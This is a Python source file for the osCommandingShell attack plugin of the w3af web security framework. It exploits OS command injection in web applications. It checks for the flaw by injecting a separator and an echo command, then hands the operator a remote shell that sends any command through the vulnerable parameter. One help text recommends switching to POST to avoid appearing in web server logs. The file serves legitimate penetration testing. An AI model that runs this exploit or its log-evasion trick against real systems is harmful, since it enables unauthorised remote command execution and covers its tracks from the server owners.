'''
osCommandingShell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from core.data.fuzzer.fuzzer import *
import core.controllers.outputManager as om
# options
from core.data.options.option import option
from core.data.options.optionList import optionList
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
import core.data.kb.knowledgeBase as kb
from core.controllers.w3afException import w3afException
from core.data.kb.shell import shell as shell

class osCommandingShell(baseAttackPlugin):
    '''
    Exploit OS Commanding vulnerabilities.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # User configured parameter
        self._changeToPost = True
        self._url = ''
        self._separator = ';'
        self._data = ''
        self._injvar = ''
        self._method = 'GET'
        self._generateOnlyOne = True

    def fastExploit( self ):
        '''
        Exploits a web app with osCommanding vuln, the settings are configured using setOptions()
        '''
        raise w3afException('Not implemented.')
    
    def getAttackType(self):
        return 'shell'
    
    def getVulnName2Exploit( self ):
        return 'osCommanding'

    def _generateShell( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as a parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln ):
            
            if vuln.getMethod() != 'POST' and self._changeToPost and self._verifyVuln( self.GET2POST( vuln ) ):
                om.out.information('The vulnerability was found using method GET, but POST is being used during this exploit.')
                vuln = self.GET2POST( vuln )
            else:
                om.out.information('The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.')
            
            # Create the shell object
            s = osShell( vuln )
            s.setUrlOpener( self._urlOpener )
            s.setCut( self._header, self._footer )
            return s
            
        else:
            return None

    def _verifyVuln( self, vuln ):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        # The vuln was saved to the kb as:
        # kb.kb.append( self, 'osCommanding', v )
        exploitDc = vuln.getDc()
        
        if exploitDc == None:
            om.out.error('You hitted bug #1948260. Please report how to reproduce it here:')
            om.out.error('https://sourceforge.net/tracker/index.php?func=detail&aid=1948260&group_id=170274&atid=853652')
            
        # Define a test command:
        rand = createRandAlpha( 8 )
        if vuln['os'] == 'windows':
            command = vuln['separator'] + 'echo ' + rand
        else:
            command = vuln['separator'] + '/bin/echo ' + rand
            
        # Lets define the result header and footer.
        functionReference = getattr( self._urlOpener , vuln.getMethod() )
        exploitDc[vuln.getVar()] = command
        try:
            response = functionReference( vuln.getURL(), str(exploitDc) )
        except w3afException, e:
            om.out.error( str(e) )
            return False
        else:
            return self._defineCut( response.getBody(), rand , exact=True )
                
    def getOptionsXML(self):
        '''
        This method returns a XML containing the Options that the plugin has.
        Using this XML the framework will build a window, a menu, or some other input method to retrieve
        the info from the user. The XML has to validate against the xml schema file located at :
        w3af/core/ui/userInterface.dtd
        
        @return: XML with the plugin options.
        ''' 
        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
        <OptionList>\
            <Option name="changeToPost">\
                <default>'+str(self._changeToPost)+'</default>\
                <desc>If the vulnerability was found in a GET request, try to change the method to POST during exploitation.</desc>\
                <help>If the vulnerability was found in a GET request, try to change the method to POST during exploitation; this is usefull for not being logged in the webserver logs ;)</help>\
                <type>boolean</type>\
            </Option>\
            <Option name="url">\
                <default>'+self._url+'</default>\
                <desc>URL to exploit with fastExploit()</desc>\
                <type>string</type>\
            </Option>\
            <Option name="method">\
                <default>'+self._method+'</default>\
                <desc>HTTP method to use with fastExploit()</desc>\
                <type>string</type>\
            </Option>\
            <Option name="injvar">\
                <default>'+self._injvar+'</default>\
                <desc>The variable name where to inject os commands.</desc>\
                <type>string</type>\
            </Option>\
            <Option name="data">\
                <default>'+self._data+'</default>\
                <desc>The data, like: f00=bar&amp;spam=eggs</desc>\
                <type>string</type>\
            </Option>\
            <Option name="separator">\
                <default>'+self._separator+'</default>\
                <desc>The separator to use between commands.</desc>\
                <help>The values for this option are usually \' ; " , ` or some other special character.</help>\
                <type>string</type>\
            </Option>\
            <Option name="generateOnlyOne">\
                <default>'+str(self._generateOnlyOne)+'</default>\
                <desc>If true, this plugin will try to generate only one shell object.</desc>\
                <type>boolean</type>\
            </Option>\
        </OptionList>\
        '

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptionsXML().
        
        @parameter OptionList: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        if optionsMap['method'] not in ['GET','POST']:
            raise w3afException('Unknown method.')
        else:
            self._method = optionsMap['method']

        self._data = optionsMap['data']
        self._injvar = optionsMap['injvar']
        self._separator = optionsMap['separator']
        self._url = optionsMap['url']
        self._changeToPost = optionsMap['changeToPost']
        self._generateOnlyOne = optionsMap['generateOnlyOne']
            
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.8
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits os commanding vulnerabilities and returns a remote shell.
        
        Six configurable parameters exist:
            - changeToPost
            - url
            - method
            - injvar
            - data
            - separator
        '''

class osShell(shell):
    def _rexec( self, command ):
        # Lets send the command.
        functionReference = getattr( self._urlOpener , self.getMethod() )
        exploitDc = self.getDc()
        exploitDc[ self.getVar() ] = self['separator'] + command
        try:
            response = functionReference( self.getURL() , str(exploitDc) )
        except w3afException, e:
            return 'Error "' + str(e) + '" while sending command to remote host. Try again.'
        else:
            return self._cut( response.getBody() )
    
    def end( self ):
        om.out.debug('osShell cleanup complete.')
        
    def getName( self ):
        return 'osCommandingShell'
        
